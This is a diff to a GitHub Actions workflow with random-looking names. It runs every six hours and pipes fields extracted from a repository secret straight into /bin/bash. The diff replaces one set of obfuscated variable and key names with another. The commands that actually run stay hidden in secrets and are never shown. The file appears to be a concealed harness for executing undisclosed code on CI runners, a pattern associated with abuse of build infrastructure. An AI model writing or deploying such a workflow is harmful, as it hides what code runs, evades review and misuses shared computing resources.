@@ -2,28 +2,23 @@ name: dongsihai7651
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
-jobs:  # 19808
+    - cron: '33 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongsihai7651
         env:
-          azfp31065: ${{ secrets.azfp31065 }}
+          yomm3094: ${{ secrets.yomm3094 }}
         run: |
-          echo $azfp31065 | jq -r .qn63486 | /bin/bash
-          echo $rjzh57 | jq -r .nuugk1 | /bin/bash
-          echo $uw6725 | jq -r .w3 | /bin/bash
-          echo $bcd612 | jq -r .zg47 | /bin/bash
-          echo $saqw28 | jq -r .l7703 | /bin/bash
-          echo $mc515 | jq -r .p583 | /bin/bash
-          echo $vhp62 | jq -r .ct42719 | /bin/bash
-          echo $ezi6 | jq -r .ldf23908 | /bin/bash
-          echo $vig914 | jq -r .k7 | /bin/bash
-          echo $zdmu0870 | jq -r .lwky46310 | /bin/bash
-          echo $oct683 | jq -r .whxp609 | /bin/bash
-          echo $leiq8 | jq -r .qb05 | /bin/bash
-          echo $ogs64 | jq -r .th377 | /bin/bash
-          echo $srzt258 | jq -r .p7 | /bin/bash
+          echo $yomm3094 | jq -r .cir4727 | /bin/bash
+          echo $f3 | jq -r .pcq9480 | /bin/bash
+          echo $mo554 | jq -r .wim1 | /bin/bash
+          echo $lcmez03 | jq -r .pv08 | /bin/bash
+          echo $crt72 | jq -r .ao591 | /bin/bash
+          echo $qfl54150 | jq -r .gyj3276 | /bin/bash
+          echo $qa00527 | jq -r .zd4727 | /bin/bash
 
